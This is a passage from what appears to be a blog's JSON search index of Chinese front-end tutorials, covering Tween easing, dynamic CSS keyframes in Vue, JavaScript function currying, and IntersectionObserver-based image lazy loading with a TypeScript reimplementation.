- d, 0, c, d) * .5 + c * .5 + b; &#125; &#125; &#125;&#125;Math.tween = Tween; 使用方法（一个例子）： 12345678910function startAnimation() &#123; let start = 0, during = 100; let _fun = function () &#123; start ++; let width = Tween.Quad.easeInOut(start, 0, 1000, during); box.style.width = width + 'px'; if (start &lt; during) requestAnimationFrame(_fun); &#125;; _fun();&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"HTML、浏览器综合","slug":"技术/前端/HTML、浏览器综合","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/HTML%E3%80%81%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BB%BC%E5%90%88/"}],"tags":[]},{"title":"Vue通过JS动态设置-keyFrame实现列表项不同动画","slug":"Vue通过JS动态设置-keyFrame实现列表项不同动画","date":"2020-07-22T16:00:00.000Z","updated":"2024-05-25T04:21:29.744Z","comments":true,"path":"2020/07/23/Vue通过JS动态设置-keyFrame实现列表项不同动画/","link":"","permalink":"https://wtaufpziv.github.io/2020/07/23/Vue%E9%80%9A%E8%BF%87JS%E5%8A%A8%E6%80%81%E8%AE%BE%E7%BD%AE-keyFrame%E5%AE%9E%E7%8E%B0%E5%88%97%E8%A1%A8%E9%A1%B9%E4%B8%8D%E5%90%8C%E5%8A%A8%E7%94%BB/","excerpt":"预期效果对于这个效果，可以选择height配合transition实现，但是css3提供了更流畅的animation，我们就用它来实现这个需求吧 可以看到每一项animation的keyframe都不一样，也就是每一项需要动态使用不同的关键帧。所以主要使用的方法就是动态地往document里插入具有不同关键帧的styleElement，然后在触发动画的地方将animation属性赋给对应的元素。","text":"预期效果对于这个效果，可以选择height配合transition实现，但是css3提供了更流畅的animation，我们就用它来实现这个需求吧 可以看到每一项animation的keyframe都不一样，也就是每一项需要动态使用不同的关键帧。所以主要使用的方法就是动态地往document里插入具有不同关键帧的styleElement，然后在触发动画的地方将animation属性赋给对应的元素。 html代码 123&lt;div :style=\"pillarAnimationStyle\"&gt; &lt;span&gt;&#123;&#123; pillar.usedCount &#125;&#125;&lt;/span&gt;&lt;/div&gt; pillarAnimationStyle是该组件的一个data。pillarHeight也是当前组件的data，表示当前项需要它渲染到的高度。index代表当前组件的序号，用来区分不同的关键帧 于是在需要触发动画的地方的代码如下： 123456789101112131415161718const style = document.createElement('style');style.setAttribute('type', 'text/css');document.head.appendChild(style);const sheet = style.sheet;sheet.insertRule( `@keyframes pillarAnimation` + this.index + `&#123; from &#123; height: 0px; &#125; to &#123; height: ` + this.pillarHeight + `px; &#125; &#125;`, 0);this.pillarAnimationStyle = &#123; animation: 'pillarAnimation' + this.index + ' .8s forwards',&#125;; 解决！！！","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"Vue","slug":"技术/前端/Vue","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/Vue/"}],"tags":[]},{"title":"由链式调用再探函数柯里化","slug":"由链式调用再探函数柯里化","date":"2020-07-21T16:00:00.000Z","updated":"2024-05-25T02:28:45.281Z","comments":true,"path":"2020/07/22/由链式调用再探函数柯里化/","link":"","permalink":"https://wtaufpziv.github.io/2020/07/22/%E7%94%B1%E9%93%BE%E5%BC%8F%E8%B0%83%E7%94%A8%E5%86%8D%E6%8E%A2%E5%87%BD%E6%95%B0%E6%9F%AF%E9%87%8C%E5%8C%96/","excerpt":"前言函数柯里化并不是JS的一个特性，而是一种处理函数的模式，我第一次接触这个概念还是在准备面试复习JS的时候，然而由于之前对函数柯里化不熟悉，复习也就没有完全理解，导致面试时候关于函数柯里化的题只要稍微有变动，就能卡得我一脸懵逼。“一知半解”可是面试中的大忌，于是我打算——再探函数柯里化。","text":"前言函数柯里化并不是JS的一个特性，而是一种处理函数的模式，我第一次接触这个概念还是在准备面试复习JS的时候，然而由于之前对函数柯里化不熟悉，复习也就没有完全理解，导致面试时候关于函数柯里化的题只要稍微有变动，就能卡得我一脸懵逼。“一知半解”可是面试中的大忌，于是我打算——再探函数柯里化。 回顾概念所谓函数柯里化，就是以函数闭包为核心，实现函数参数不确定的情况下函数能链式调用并且每一次调用都能取得正确的值，这个值并不会立即返回，事实上，每次调用返回的依然是一个可调用的函数。 这样的函数整个过程实际上就是：逐步接受参数-不立即输出结果-返回一个接受参数的函数。因此这样的函数也称作“部分计算函数”、“懒累积计算函数（公司大佬取得名字，挺形象）”， 延迟计算和参数复用先来看个例子： 1234567891011121314151617181920212223242526let currying = (fn) =&gt; &#123; let arr = []; let next = (...args) =&gt; &#123; if (args.length &gt; 0) &#123; arr.push(...args); // 实现链式调用 return next; &#125; else &#123; return fn(...arr); &#125; &#125; return next;&#125;let add = currying((...args) =&gt; &#123; let sum = 0; for (let item of args) &#123; sum += item; &#125; return sum;&#125;)add(1);add(2, 3);add(4);let sum = add(5)();console.log(sum); // 15 上述例子我们可以很清楚的看到延迟计算，复用参数这两个柯里化函数的特点： 直到最终传入一个空参数引发了计算之前，调用add函数并没有发生计算，只是将传入的参数放到一个数组中保存起来——延迟计算 了解函数闭包的特性的人应该知道，函数闭包内部如果用到了外部函数内的变量，那么这个变量不会随着外部函数执行完销毁而消失，而是会保留在内存中。每次调用add保存下来的参数都得以在内存中保留以供后面使用——参数复用 函数执行的时机对于函数执行的时机，上文的方法是判断传入的参数个数，当没有参数的时候就执行 但是，也可以通过重写Function的toString来优雅地返回函数调用的结果 12345678910111213function add(...args) &#123; const flag = [...args]; const modifyFun = function(...args) &#123; flag.push(...args); return modifyFun; &#125; modifyFun.valueOf = modifyFun.toString = function() &#123; return flag.reduce(function(res, cur) &#123; return cur + res; &#125;) &#125; return modifyFun;&#125; 这样我们每次需要读取函数的值时都会调用toString方法，而计算的过程就在toString函数里面执行，即不破坏延迟执行，又可以优雅地返回结果 但是对于上述代码，柯里化和加法操作被耦合在了一起，我们可以像第一个例子那样稍作改动，将功能抽离出来 12345678910111213141516function tool(fn) &#123; const flag = []; const modifyFun = function(...args) &#123; flag.push(...args); return modifyFun; &#125; modifyFun.valueOf = modifyFun.toString = function() &#123; return fn(...flag) &#125; return modifyFun;&#125;let add = tool(function(...args) &#123; return [...args].reduce(function(res, cur) &#123; return cur * res; &#125;)&#125;)","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"JavaScript","slug":"技术/前端/JavaScript","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/JavaScript/"}],"tags":[]},{"title":"IntersectionObserver与图片懒加载","slug":"IntersectionObserver与图片懒加载","date":"2020-06-29T16:00:00.000Z","updated":"2024-05-25T04:21:29.812Z","comments":true,"path":"2020/06/30/IntersectionObserver与图片懒加载/","link":"","permalink":"https://wtaufpziv.github.io/2020/06/30/IntersectionObserver%E4%B8%8E%E5%9B%BE%E7%89%87%E6%87%92%E5%8A%A0%E8%BD%BD/","excerpt":"文章参考：IntersectionObserver 和图片懒加载 关于 IntersectionObserverIntersectionObserver 这个 API 平常可能听得比较少，caniuse 兼容性报告目前支持率是 90.12%，还不推荐用于大众化的场景中，但是它的能力和性能非常的好。IntersectionObserver 接口 (从属于Intersection Observer API) 提供了一种异步观察目标元素与其祖先元素或顶级文档视窗(viewport)交叉状态的方法。祖先元素与视窗(viewport)被称为根(root)。由于可见（visible）的本质是，目标元素与视口产生一个交叉区，所以这个 API 叫做”交叉观察器“。","text":"文章参考：IntersectionObserver 和图片懒加载 关于 IntersectionObserverIntersectionObserver 这个 API 平常可能听得比较少，caniuse 兼容性报告目前支持率是 90.12%，还不推荐用于大众化的场景中，但是它的能力和性能非常的好。IntersectionObserver 接口 (从属于Intersection Observer API) 提供了一种异步观察目标元素与其祖先元素或顶级文档视窗(viewport)交叉状态的方法。祖先元素与视窗(viewport)被称为根(root)。由于可见（visible）的本质是，目标元素与视口产生一个交叉区，所以这个 API 叫做”交叉观察器“。 简单点说就是它可以观察 root（默认是视口）和目标元素的交叉情况，当交叉率是 0% 或者 10% 或者更多的时候，可以触发指定的回调。 当一个 IntersectionObserver 对象被创建时，其被配置为监听根中一段给定比例的可见区域。一旦 IntersectionObserver 被创建，则无法更改其配置，所以一个给定的观察者对象只能用来监听可见区域的特定变化值；然而，你可以在同一个观察者对象中配置监听多个目标元素。 使用const observer = new IntersectionObserver(callback, observerConfig) 创建一个新的 IntersectionObserver 对象，当其监听到目标元素的可见部分穿过了一个或多个阈(thresholds)时，会执行指定的回调函数。 使用示例： 1234567891011121314151617181920212223function cb (entries) &#123; console.log(entries) entries.forEach(entry =&gt; &#123; const target = entry.target; console.log(target) console.log(entry) &#125;);&#125;let observerConfig = &#123; root: null, rootMargin: '0px', threshold: [0],&#125;const observer = new IntersectionObserver(cb, observerConfig)const box = document.getElementById('#box')// 开始观察observer.observe(box)// 停止观察observer.unobserve(box)// 关闭观察器，observer 所有的观察都会停止observer.disconnect(); entries 是一个监听目标的数组，每个成员都是一个 IntersectionObserverEntry 对象。 cb 回调函数在最初会调用一次，这次 entries 会是所有的观察目标对象。而在滑动的时候会把可见性变化符合 threshold 的对象作为 entries 传进来。 IntersectionObserverEntry对象123456789&#123; boundingClientRect: DOMRectReadOnly &#123;x: 8, y: 380, width: 300, height: 300, top: 380, …&#125; intersectionRatio: 0.023333333432674408 intersectionRect: DOMRectReadOnly &#123;x: 8, y: 380, width: 300, height: 7, top: 380, …&#125; isIntersecting: true rootBounds: DOMRectReadOnly &#123;x: 0, y: 0, width: 1903, height: 387, top: 0, …&#125; target: img.lazy time: 440149.8099999735&#125; time：可见性发生变化的时间，是一个高精度时间戳，单位为毫秒，返回一个记录从 IntersectionObserver 的时间原点(time origin)到交叉被触发的时间的时间戳(DOMHighResTimeStamp). target：被观察的目标元素，是一个 DOM 节点对象 rootBounds：根元素的矩形区域的信息，getBoundingClientRect() 方法的返回值，如果没有根元素（即直接相对于视口滚动），则返回 null boundingClientRect：目标元素的矩形区域的信息 intersectionRect：目标元素与视口（或根元素）的交叉区域的信息 intersectionRatio：目标元素的可见比例，即 intersectionRect 占 boundingClientRect 的比例，完全可见时为 1，完全不可见时小于等于0 isIntersecting 是否交叉 callback参数目标元素的可见性变化时，就会调用观察器的回调函数callback。 callback一般会触发两次。一次是目标元素刚刚进入视口（开始可见），另一次是完全离开视口（开始不可见）。简单来说，就是可见性发生变化。不过这取决于option中的threshold 12345var io = new IntersectionObserver( entries =&gt; &#123; console.log(entries); &#125;); 上面代码中，回调函数采用的是箭头函数的写法。callback函数的参数（entries）是一个数组，每个成员都是一个IntersectionObserverEntry对象。举例来说，如果同时有两个被观察的对象的可见性发生变化，entries数组就会有两个成员。 配置optionIntersectionObserver构造函数的第二个参数是一个配置对象。它可以设置以下属性。 threshold 属性threshold属性决定了什么时候触发回调函数。它是一个数组，每个成员都是一个门槛值，默认为[0]，即交叉比例（intersectionRatio）达到0时触发回调函数。 123456new IntersectionObserver( entries =&gt; &#123;/* ... */&#125;, &#123; threshold: [0, 0.25, 0.5, 0.75, 1] &#125;); 用户可以自定义这个数组。比如，[0, 0.25, 0.5, 0.75, 1]就表示当目标元素 0%、25%、50%、75%、100% 可见时，会触发回调函数。 root 属性，rootMargin 属性很多时候，目标元素不仅会随着窗口滚动，还会在容器里面滚动（比如在iframe窗口里滚动）。容器内滚动也会影响目标元素的可见性 IntersectionObserver API 支持容器内滚动。root属性指定目标元素所在的容器节点（即根元素）。注意，容器元素必须是目标元素的祖先节点。 123456789var opts = &#123; root: document.querySelector('.container'), rootMargin: \"500px 0px\" &#125;;var observer = new IntersectionObserver( callback, opts); 上面代码中，除了root属性，还有rootMargin属性。后者定义根元素的margin，用来扩展或缩小rootBounds这个矩形的大小，从而影响intersectionRect交叉区域的大小。它使用CSS的定义方法，比如10px 20px 30px 40px，表示 top、right、bottom 和 left 四个方向的值。 这样设置以后，不管是窗口滚动或者容器内滚动，只要目标元素可见性变化，都会触发观察器。 注意点IntersectionObserver API 是异步的，不随着目标元素的滚动同步触发。 规格写明，IntersectionObserver的实现，应该采用requestIdleCallback()，即只有线程空闲下来，才会执行观察器。这意味着，这个观察器的优先级非常低，只在其他任务执行完，浏览器有了空闲才会执行。 懒加载懒加载的常规实现常规实现都会监听滚动事件，通过 el.getBoundingClientRect() 获取到当前元素与视口的位置关系来确定图片是否加载，在加载完成之后为了性能考虑，删除 data-src ，这样就可以避免重复的执行，要注意的是 getBoundingClientRect 会触发浏览器的回流。 1img.dataset.src &amp;&amp; img.getBoundingClientRect().bottom &gt;= 0 &amp;&amp; windowHeight &gt; img.getBoundingClientRect().top 如果不存在 data-src 则直接跳过（性能优化）； 判断元素底部是否出现在视口中，出现则显示； 判断元素顶部是否出现在视口中，出现则显示； 利用intersectionObserve实现懒加载通过isIntersecting或者intersectionRatio是否大于0判断元素是否在视窗内，并通过data-src来实现懒加载 1234567891011121314151617181920&lt;ul class=\"box\"&gt; &lt;li&gt;&lt;img src=\"http://placehold.it/450x300/caaa8e/ccc.png\" data-src=\"https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1549272664908&amp;di=4bb90ffd078e31348159c07e78947f0a&amp;imgtype=0&amp;src=http%3A%2F%2Fb-ssl.duitang.com%2Fuploads%2Fitem%2F201610%2F08%2F20161008151749_2VAKU.jpeg\" alt=\"\"&gt;&lt;/li&gt; &lt;li&gt;&lt;img src=\"http://placehold.it/450x300/caaa8e/ccc.png\" data-src=\"https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1549272664908&amp;di=4bb90ffd078e31348159c07e78947f0a&amp;imgtype=0&amp;src=http%3A%2F%2Fb-ssl.duitang.com%2Fuploads%2Fitem%2F201610%2F08%2F20161008151749_2VAKU.jpeg\" alt=\"\"&gt;&lt;/li&gt; &lt;li&gt;&lt;img src=\"http://placehold.it/450x300/caaa8e/ccc.png\" data-src=\"https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1549272664908&amp;di=4bb90ffd078e31348159c07e78947f0a&amp;imgtype=0&amp;src=http%3A%2F%2Fb-ssl.duitang.com%2Fuploads%2Fitem%2F201610%2F08%2F20161008151749_2VAKU.jpeg\" alt=\"\"&gt;&lt;/li&gt; &lt;li&gt;&lt;img src=\"http://placehold.it/450x300/caaa8e/ccc.png\" data-src=\"https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1549272664908&amp;di=4bb90ffd078e31348159c07e78947f0a&amp;imgtype=0&amp;src=http%3A%2F%2Fb-ssl.duitang.com%2Fuploads%2Fitem%2F201610%2F08%2F20161008151749_2VAKU.jpeg\" alt=\"\"&gt;&lt;/li&gt; &lt;li&gt;&lt;img src=\"http://placehold.it/450x300/caaa8e/ccc.png\" data-src=\"https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1549272664908&amp;di=4bb90ffd078e31348159c07e78947f0a&amp;imgtype=0&amp;src=http%3A%2F%2Fb-ssl.duitang.com%2Fuploads%2Fitem%2F201610%2F08%2F20161008151749_2VAKU.jpeg\" alt=\"\"&gt;&lt;/li&gt; &lt;li&gt;&lt;img src=\"http://placehold.it/450x300/caaa8e/ccc.png\" data-src=\"https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1549272664908&amp;di=4bb90ffd078e31348159c07e78947f0a&amp;imgtype=0&amp;src=http%3A%2F%2Fb-ssl.duitang.com%2Fuploads%2Fitem%2F201610%2F08%2F20161008151749_2VAKU.jpeg\" alt=\"\"&gt;&lt;/li&gt; &lt;li&gt;&lt;img src=\"http://placehold.it/450x300/caaa8e/ccc.png\" data-src=\"https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1549272664908&amp;di=4bb90ffd078e31348159c07e78947f0a&amp;imgtype=0&amp;src=http%3A%2F%2Fb-ssl.duitang.com%2Fuploads%2Fitem%2F201610%2F08%2F20161008151749_2VAKU.jpeg\" alt=\"\"&gt;&lt;/li&gt; &lt;li&gt;&lt;img src=\"http://placehold.it/450x300/caaa8e/ccc.png\" data-src=\"https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1549272664908&amp;di=4bb90ffd078e31348159c07e78947f0a&amp;imgtype=0&amp;src=http%3A%2F%2Fb-ssl.duitang.com%2Fuploads%2Fitem%2F201610%2F08%2F20161008151749_2VAKU.jpeg\" alt=\"\"&gt;&lt;/li&gt; &lt;li&gt;&lt;img src=\"http://placehold.it/450x300/caaa8e/ccc.png\" data-src=\"https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1549272664908&amp;di=4bb90ffd078e31348159c07e78947f0a&amp;imgtype=0&amp;src=http%3A%2F%2Fb-ssl.duitang.com%2Fuploads%2Fitem%2F201610%2F08%2F20161008151749_2VAKU.jpeg\" alt=\"\"&gt;&lt;/li&gt; &lt;li&gt;&lt;img src=\"http://placehold.it/450x300/caaa8e/ccc.png\" data-src=\"https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1549272664908&amp;di=4bb90ffd078e31348159c07e78947f0a&amp;imgtype=0&amp;src=http%3A%2F%2Fb-ssl.duitang.com%2Fuploads%2Fitem%2F201610%2F08%2F20161008151749_2VAKU.jpeg\" alt=\"\"&gt;&lt;/li&gt; &lt;li&gt;&lt;img src=\"http://placehold.it/450x300/caaa8e/ccc.png\" data-src=\"https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1549272664908&amp;di=4bb90ffd078e31348159c07e78947f0a&amp;imgtype=0&amp;src=http%3A%2F%2Fb-ssl.duitang.com%2Fuploads%2Fitem%2F201610%2F08%2F20161008151749_2VAKU.jpeg\" alt=\"\"&gt;&lt;/li&gt; &lt;li&gt;&lt;img src=\"http://placehold.it/450x300/caaa8e/ccc.png\" data-src=\"https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1549272664908&amp;di=4bb90ffd078e31348159c07e78947f0a&amp;imgtype=0&amp;src=http%3A%2F%2Fb-ssl.duitang.com%2Fuploads%2Fitem%2F201610%2F08%2F20161008151749_2VAKU.jpeg\" alt=\"\"&gt;&lt;/li&gt; &lt;li&gt;&lt;img src=\"http://placehold.it/450x300/caaa8e/ccc.png\" data-src=\"https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1549272664908&amp;di=4bb90ffd078e31348159c07e78947f0a&amp;imgtype=0&amp;src=http%3A%2F%2Fb-ssl.duitang.com%2Fuploads%2Fitem%2F201610%2F08%2F20161008151749_2VAKU.jpeg\" alt=\"\"&gt;&lt;/li&gt; &lt;li&gt;&lt;img src=\"http://placehold.it/450x300/caaa8e/ccc.png\" data-src=\"https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1549272664908&amp;di=4bb90ffd078e31348159c07e78947f0a&amp;imgtype=0&amp;src=http%3A%2F%2Fb-ssl.duitang.com%2Fuploads%2Fitem%2F201610%2F08%2F20161008151749_2VAKU.jpeg\" alt=\"\"&gt;&lt;/li&gt; &lt;li&gt;&lt;img src=\"http://placehold.it/450x300/caaa8e/ccc.png\" data-src=\"https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1549272664908&amp;di=4bb90ffd078e31348159c07e78947f0a&amp;imgtype=0&amp;src=http%3A%2F%2Fb-ssl.duitang.com%2Fuploads%2Fitem%2F201610%2F08%2F20161008151749_2VAKU.jpeg\" alt=\"\"&gt;&lt;/li&gt; &lt;li&gt;&lt;img src=\"http://placehold.it/450x300/caaa8e/ccc.png\" data-src=\"https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1549272664908&amp;di=4bb90ffd078e31348159c07e78947f0a&amp;imgtype=0&amp;src=http%3A%2F%2Fb-ssl.duitang.com%2Fuploads%2Fitem%2F201610%2F08%2F20161008151749_2VAKU.jpeg\" alt=\"\"&gt;&lt;/li&gt; &lt;li&gt;&lt;img src=\"http://placehold.it/450x300/caaa8e/ccc.png\" data-src=\"https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1549272664908&amp;di=4bb90ffd078e31348159c07e78947f0a&amp;imgtype=0&amp;src=http%3A%2F%2Fb-ssl.duitang.com%2Fuploads%2Fitem%2F201610%2F08%2F20161008151749_2VAKU.jpeg\" alt=\"\"&gt;&lt;/li&gt; &lt;li&gt;&lt;img src=\"http://placehold.it/450x300/caaa8e/ccc.png\" data-src=\"https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1549272664908&amp;di=4bb90ffd078e31348159c07e78947f0a&amp;imgtype=0&amp;src=http%3A%2F%2Fb-ssl.duitang.com%2Fuploads%2Fitem%2F201610%2F08%2F20161008151749_2VAKU.jpeg\" alt=\"\"&gt;&lt;/li&gt;&lt;/ul&gt; JS代码： 123456789101112const imgs = document.querySelectorAll('img')const io = new IntersectionObserver(entries =&gt; &#123; entries.forEach(entry =&gt; &#123; if (entry &amp;&amp; entry.isIntersecting) &#123; entry.target.src = entry.target.dataset.src io.unobserve(entry.target) &#125; &#125;)&#125;)imgs.forEach(item =&gt; &#123; io.observe(item)&#125;) 简单实现intersectionObserve定义entry对象通过对这个api的简单了解我们知道，每次我们监听的元素发生可见性的变化，回调函数都会传回一个数组，这个数组的每个成员都是一个entry对象，这个对象有两个属性值： target：当前对象监听的element元素 isIntersecting：当前监听的对象是不是处于交叉状态 我们先定义好这个entry对象： 12345678class CustomEntry &#123; public targe: Element; public isIntersecting: boolean; public constructor(options) &#123; this.target = options.target; this.isIntersecting = options.isIntersecting &#125;&#125; 定制intersectionObserve接下来就要开始定制intersectionObserve，我们取名CustomObserve 先确定一些interface:12345678910111213141516interface CustomObserverOptions &#123; rootMargin?: String, root?: Element&#125;interface marginValueFormat &#123; value: number, unit: String&#125;interface Rect &#123; width: number, height: number, top: number, left: number, right: number, bottom: number&#125; 成员变量 当前监听的所有element元素 当前监听的所有element-entry的映射集 递归调用的间隔 是否开始监听 可见性发生变化的回调函数：构造函数传参 监听元素的root元素（root含义参考上面）：构造函数传参，默认为整个页面，即浏览器的视窗 扩展root元素的一些margin值：构造函数传参 123456789class CustomObserver &#123; private _targets: Set&lt;Element&gt;; private _entries: Map&lt;Element, CustomEntry&gt;; private _interval: number; private _isObserving: boolean; private _callback: (entries: Array&lt;CustomEntry&gt;) =&gt; void; private root: Element | null; private _rootMarginValues: Array&lt;marginValueFormat&gt;&#125; 构造函数接下来是它的构造函数方法，初始化时传入两个参数：一个回调函数，当可见性发生变化时调用。一个相关配置项，用于传入root元素以及它的margin： 123456789public constructor(callback:() =&gt; void, options: CustomObserverOptions = &#123;&#125;) &#123; this._targets = new Set();//监听的元素集 this._entries = new Map();//监听的元素-entry映射集 this._interval = 150; this._isObserving = false; this._callback = callback; this.root = options.root || null; this._rootMarginValues = parseMargin(options.rootMargin);//将传入的类似'15px 20px'的字符串格式化成下面这样方便后续计算'&#125; 启停监听于清除监听接下来就是设置开始监听和结束监听的方法，还有清除所有监听的方法，以及设置监听完成之后的启动监听方法，涉及到四个函数： 12345678910111213141516171819public observe(target: Element): void &#123; this._targets.add(target); this._startObservation();&#125;public unobserve(target: Element): void &#123; this._targets.delete(target); this._entries.delete(target);&#125;public disconnect(): void &#123; this._targets.clear(); this._entries.clear();&#125;public _startObservation(): any &#123; if (this._isObserving) &#123; return; &#125; this._isObserving = true; this._checkIntersection();&#125; 设计交叉检查然后就是最关键的检查交叉环节了，由于我们需要密集执行函数达到监听的目的，我们使用requestAnimationFrame来调用我们的函数： 1const nextFrame = window.requestAnimationFrame 然后就可以设计检查交叉函数： 扩展root元素在之前我们了解到，不管是窗口滚动或者容器内滚动，只要目标元素可见性变化，都会触发观察器，因此对于root元素我们还需要进行一次设置，用户可以通过option的rootMarginValue设置root元素的margin来调整root块的大小 1234567public _checkIntersection() &#123; nextFrame(() =&gt; &#123; const changedEntries: CustomEntry[] = [];//设置一个数组用于存放可见性发生变化的元素，之后这个数组将直接返回 const rootRect = expandRectByRootMargin(CustomObserver._getClientRect(this.root || document), this._rootMarginValues); //... &#125;)&#125; 格式化用户option中传入的rootMargin_rootMarginValues值由用户传入的参数经过parseMargin函数格式化后得来： 123456789101112131415161718192021222324function parseMargin(margin: String | undefined): Array&lt;marginValueFormat&gt; &#123; const marginString = margin || '0px'; const margins = marginString.split(/\\s+/).map(function (margin) &#123; const parts = /^(-?\\d*\\.?\\d+)(px|%)$/.exec(margin); if (!parts) &#123; throw new Error('rootMargin must be specified in pixels or percent'); &#125; return &#123; value: parseFloat(parts[1]), unit: parts[2] &#125;; &#125;); // Handles shorthand. margins[1] = margins[1] || margins[0]; margins[2] = margins[2] || margins[0]; margins[3] = margins[3] || margins[1]; return margins;&#125;//'15px 20px'格式化后：/* [ &#123; value: 15, unit: 'px' &#125;, &#123; value: 20, unit: 'px' &#125;, &#123; value: 15, unit: 'px' &#125;, &#123; value: 20, unit: 'px' &#125; ]*/ 获取root元素相对视窗的位置_getClientRect用于获取root元素相对于视窗的位置，返回Rect类型（相关API：getBoundingClientRect）： 如果root是document，那么直接可以得出相关值 如果是其他元素，调用getBoundingClientRect进行计算 如果该API调用出错，则返回一个大小为0的root元素 1234567891011121314151617181920212223242526272829static _getClientRect(el: any): Rect &#123; if (el === document) &#123; const html = document.documentElement; const body = document.body; return &#123; top: 0, left: 0, right: html.clientWidth || body.clientWidth, width: html.clientWidth || body.clientWidth, bottom: html.clientHeight || body.clientHeight, height: html.clientHeight || body.clientHeight, &#125;; &#125; try &#123; return el.getBoundingClientRect(); &#125; catch (e) &#123; return getEmptyRect(); &#125;&#125;function getEmptyRect():Rect &#123; return &#123; top: 0, bottom: 0, left: 0, right: 0, width: 0, height: 0, &#125;;&#125; 计算得出最终的root元素大小expandRectByRootMargin用于计算得出，加上用户的rootMarginValue扩展之后的root元素大小： 1234567891011121314151617function expandRectByRootMargin(rect: Rect, rootMarginValues: Array&lt;marginValueFormat&gt;): Rect &#123; const margins = rootMarginValues.map(function (margin, i) &#123; return margin.unit === 'px' ? margin.value : margin.value * (i % 2 ? rect.width : rect.height) / 100; &#125;); const newRect: Rect = &#123; top: rect.top - margins[0], right: rect.right + margins[1], bottom: rect.bottom + margins[2], left: rect.left - margins[3], width:0, height:0 &#125;; newRect.width = newRect.right - newRect.left; newRect.height = newRect.bottom - newRect.top; return newRect;&#125; 可见性判断调整完root元素之后我们就可以遍历所有监听元素，对他们的可见性进行判断： 123456789101112131415161718192021public _checkIntersection() &#123; nextFrame(() =&gt; &#123; //... for (const el of this._targets) &#123; const isDisplay = checkIsDisplay(el); const rect = el.getBoundingClientRect(); // 降级到CustomObserver仅仅校验位置是否交叉，交叉就当做元素已经展示了 const intersectionRect = computeRectIntersection(rect, rootRect); const newEntry = new CustomEntry(&#123; target: el, isIntersecting: isDisplay &amp;&amp; !!intersectionRect, &#125;); const oldEntry = this._entries.get(el); if (!oldEntry || oldEntry.isIntersecting !== newEntry.isIntersecting) &#123; changedEntries.push(newEntry); &#125; this._entries.set(el, newEntry); &#125; //... &#125;)&#125; 上述代码包含这些步骤： 先检查这个元素的display值是不是none：123456789101112function checkIsDisplay(el: Element): boolean &#123; let ele: Element | null = el while (ele) &#123; if (el.nodeType === 1) &#123; if (getComputedStyle(el).display === 'none') &#123; return false; &#125; ele = ele.parentElement; &#125; &#125; return true;&#125; 获取当前元素相对于视窗的位置 根据当前元素相对于视窗的位置和root元素相对于视窗的位置，计算当前元素和root元素是否有交叉 更新元素-entry映射集，并将可见性发生了变化的元素加入到changedEntries中 计算是否有交叉在交叉检查这一步当中，最核心的当属计算是否有交叉检查，根据当前元素相对于视窗的位置和root元素相对于视窗的位置计算得到,没有交叉则返回false，否则返回交叉部分的信息： 12345678910111213141516function computeRectIntersection(rect1: Rect, rect2: Rect): boolean | Rect &#123; const top = Math.max(rect1.top, rect2.top); const bottom = Math.min(rect1.bottom, rect2.bottom); const left = Math.max(rect1.left, rect2.left); const right = Math.min(rect1.right, rect2.right); const width = right - left; const height = bottom - top; return width &gt;= 0 &amp;&amp; height &gt;= 0 &amp;&amp; &#123; top: top, bottom: bottom, left: left, right: right, width: width, height: height, &#125;;&#125; 调用回调函数当可见性发生变化的元素的数量大于0时，就可以调用回调函数 12345678public _checkIntersection() &#123; nextFrame(() =&gt; &#123; //... if (changedEntries.length) &#123; this._callback(changedEntries); &#125; &#125;)&#125; 递归调用交叉检查函数只要监听的元素数量大于0，就永远都要不断执行检查函数，这个时候就可以进行递归调用 12345678910public _checkIntersection() &#123; nextFrame(() =&gt; &#123; //... if (this._targets.size &gt; 0) &#123; setTimeout(() =&gt; this._checkIntersection(), this._interval); &#125; else &#123; this._isObserving = false; &#125; &#125;)&#125; 完成至此，一个简单的intersectionObserve就完成了： 